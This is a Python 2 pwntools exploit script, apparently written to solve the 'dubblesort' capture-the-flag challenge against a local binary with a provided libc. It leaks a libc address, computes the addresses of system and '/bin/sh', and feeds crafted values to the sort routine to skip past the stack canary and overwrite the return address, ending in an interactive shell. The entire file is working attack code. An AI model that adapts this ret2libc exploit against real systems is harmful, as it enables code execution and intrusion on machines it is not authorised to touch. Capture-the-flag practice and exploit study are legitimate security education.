# -*- coding: utf-8 -*-
from pwn import *
context(os='linux',arch='i386')#,log_level='debug'
lib='/tmp/ctf/20180521/dubblesort/libc_32.so.6'
libc = ELF(lib)
env={'LD_PRELOAD':lib}
r = process('./dubblesort',env=env)
#gdb.attach(r)#,'b *read\nc\n')
r.sendlineafter('What your name :','a'*27)
text = r.recv()
y=unpack(text[34:38],32,endian='little')
libc.address =   y - 0x1AE244
bin = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))

#rop =ROP(libc)
#rop.execve(bin_sh,0,0)
#print rop.dump()
print 'libc ELF InitTable:', hex(y)
print 'base addr:',hex(libc.address)
print 'shell addr:',hex(bin)
print 'bin_sh addr:',hex(bin_sh)
raw_input('----------------pause-------------')
r.sendline(str(0x10+0x8+1+3+4+1+1+9))
for x in  range(0xF):
    r.sendlineafter('number :', str(x))
r.sendlineafter('number :',  str(bin))
r.sendlineafter('number :',  str(bin))
r.sendlineafter('number :',  str(bin))
r.sendlineafter('number :',  str(bin))
r.sendlineafter('number :', str(bin))
r.sendlineafter('number :', str(bin))
r.sendlineafter('number :', str(bin))
r.sendlineafter('number :', str(bin_sh))
r.sendlineafter('number :', str(bin_sh))
r.sendlineafter('number :', "=")
r.recvuntil('Result :')
text = r.recv()
text2 =text.split('***')
if len(text2)>1:
    print text2[1:]
y=0
for x in text2[0].strip().split(' '):
    y+=1
    print hex(int(x,10)),' ',
    if y==8 or y==24 or y==25 or y==28 or y==32 or y==33:
        print
print
if 'smashing' not in text:
    r.interactive()
